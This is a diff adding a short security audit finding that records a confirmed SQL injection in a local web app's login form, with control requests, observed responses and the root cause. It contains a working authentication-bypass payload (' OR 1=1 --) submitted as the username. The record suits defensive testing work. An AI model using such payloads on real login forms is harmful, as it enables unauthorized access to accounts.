@@ -1,0 +1,29 @@
+Finding: F-02 — SQL injection in login
+Date: 2026-11-01T23:59:44.8874661+07:00
+Git commit: 93a2e9bf8cd3306d64edc25351c97fbb604b7303
+Target: POST http://localhost:8080/login
+
+Control 1:
+Username: alice
+Password: wrong-password
+Expected: 401
+Observed: 401
+
+Control 2:
+Username: alice
+Password: valid seeded password
+Expected: 302 with session
+Observed: 302 with session; cookie value not recorded
+
+Exploit:
+Username: ' OR 1=1 -- [trailing space included]
+Password: anything
+Observed response status: 302
+Observed location: /
+Session cookie returned: yes; value not recorded
+Authenticated homepage indicator: confirmed in prior test
+
+Root cause:
+User-controlled username is interpolated into the SQL query.
+
+Result: CONFIRMED
